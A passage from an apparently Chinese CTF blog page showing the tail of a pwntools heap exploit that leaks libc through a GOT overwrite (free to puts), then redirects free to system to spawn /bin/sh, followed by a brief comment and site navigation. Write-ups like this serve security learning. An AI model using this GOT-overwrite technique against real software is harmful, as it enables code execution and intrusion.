elf.plt[&#x27;puts&#x27;]</span><br><span class="line">putsGotAddr = elf.got[&#x27;puts&#x27;]</span><br><span class="line">add(0x20, p64(arrAddr))</span><br><span class="line">add(0x20, &#x27;second&#x27;)</span><br><span class="line">add(0x20, &#x27;first&#x27;)</span><br><span class="line"></span><br><span class="line">add(0x20, p64(freeGotAddr))</span><br><span class="line">edit(1, p64(putsPltAddr))</span><br><span class="line"># ptr = free_got =&gt; puts_plt</span><br><span class="line"></span><br><span class="line">edit(6, p64(putsGotAddr))</span><br><span class="line">delete(1)</span><br><span class="line"># ptr = puts_got</span><br><span class="line">LeakStr = r.recvuntil(&#x27;\n&#x27;, drop=True)</span><br><span class="line">libcBaseAddr = u64(LeakStr.ljust(8, &#x27;\x00&#x27;)) - libc.symbols[&#x27;puts&#x27;]</span><br><span class="line">systemAddr = libcBaseAddr + libc.symbols[&#x27;system&#x27;]</span><br><span class="line">print(&#x27;libc base address: 0x%x&#x27; % libcBaseAddr)</span><br><span class="line">print(&#x27;systemAdd address: 0x%x&#x27; % systemAddr)</span><br><span class="line"># overwrite arrAddr[1] to free@got</span><br><span class="line">edit(6, p64(freeGotAddr))</span><br><span class="line"># overwrite free@got to system</span><br><span class="line">edit(1, p64(systemAddr))</span><br><span class="line"># system(&quot;/bin/sh&quot;)</span><br><span class="line">delete(0)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>这个应该是最符合这题要求的最简洁的预期解了,就是简单的修改 got 表,不需要改 io_file 的结构什么的,看 dalao 的 wp 把我看蒙了,毕竟第一次接触到这种没有 leak 的题,发现还可以</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/10/11/2019-10-14-2nd_week/" data-id="cuid0Ld-RVUU9DaFySL6_Tb4-" data-title="second week" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AI/">AI</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzz/" rel="tag">Fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Misc/" rel="tag">Misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ai/" rel="tag">ai</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/chat/" rel="tag">chat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/" rel="tag">tools</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF/" style="font-size: 17.5px;">CTF</a> <a href="/tags/Fuzz/" style="font-size: 10px;">Fuzz</a> <a href="/tags/Misc/" style="font-size: 12.5px;">Misc</a> <a href="/tags/Web/" style="font-size: 12.5px;">Web</a> <a href="/tags/ai/" style="font-size: 10px;">ai</a> <a href="/tags/chat/" style="font-size: 15px;">chat</a> <a href="/tags/fuzz/" style="font-size: 10px;">fuzz</a> <a href="/tags/misc/" style="font-size: 17.5px;">misc</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/tools/" style="font-size: 10px;">tools</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/08/">August 1999</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/01/">January 1999</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/10/01/hello-world/">Hello World</a>
          </li>
        
          <li>
            <a href="/2023/06/27/2023-06-27-fuzzer/">如何完成一个 fuzzer</a>
          </li>
        
          <li>
            <a href="/2023/05/31/2023-05-31-report/">安全开发</a>
          </li>
        
          <li>
            <a href="/2023/05/31/2023-06-18-fixandPR/">记一次 fuzz go 的一个第三方库</a>
          </li>
        
          <li>
            <a href="/2023/05/23/2023-05-23-waf/">AI 安全之</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>